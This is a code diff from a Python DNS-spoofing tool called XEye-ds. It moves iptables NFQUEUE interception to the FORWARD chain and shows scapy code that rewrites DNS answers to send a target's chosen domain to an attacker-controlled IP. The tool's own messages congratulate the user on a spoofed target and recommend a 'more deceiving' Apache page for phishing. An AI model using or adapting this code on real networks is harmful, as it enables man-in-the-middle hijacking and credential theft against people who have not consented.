@@ -57,9 +57,9 @@ def Checkroot():
 Checkroot()
 time.sleep(2)
 print("\n [Info] --> Configure Firewall for DNS spoofing compatibility - please wait .....")
-subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 3",shell=True)
-subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 3",shell=True)
-# subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 3",shell=True)
+# subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 3",shell=True)
+# subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 3",shell=True)
+subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 3",shell=True)
 time.sleep(2)
 print("\n[Info] --> Enabling your Apache Server - Please wait ......")
 print("[Recommendation] --> It is recommended to replace the apache index.html file to a more deceiving index.html file")
@@ -121,7 +121,7 @@ try:
         if ippacket.haslayer(sc.DNSRR):
             reqname = ippacket[sc.DNSQR].qname
             if domain in str(reqname):
-                print("[Attention] --> Target is spoofed and directed to "+ip+" ....")
+                print("[Congrats] --> Target is spoofed and directed to "+ip+" ....")
                 anspof = sc.DNSRR(rrname=domain, rdata=ip)
                 ippacket[sc.DNS].an = anspof
                 ippacket[sc.DNS].ancount = 1
@@ -145,4 +145,4 @@ except:
     time.sleep(2)
     print("[Info]--> Everything is now restored :)")
     print("[Info] --> If you have any questions or need help, please message us on our FB page \"https://www.facebook.com/XEyecs/\" ")
-    print("[] --> Thank you for using XEye-ds - Mostafa Ahmad")
+    print("[❤] --> Thank you for using XEye-ds - Mostafa Ahmad")
